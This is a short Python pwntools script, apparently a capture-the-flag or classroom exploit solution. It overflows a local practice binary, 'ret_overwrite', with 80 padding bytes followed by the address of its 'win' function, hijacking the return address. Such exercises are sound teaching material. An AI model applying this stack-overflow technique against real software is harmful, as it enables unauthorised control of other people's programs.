#!/usr/bin/python
from pwn import *
import sys

if len(sys.argv) == 1:
    target = "./ret_overwrite"
else:
    target = sys.argv[1]

e = ELF(target)
win_address = e.symbols["win"]

p = process(target)
p.sendline("A" * 80 + p64(win_address))
print p.recv()
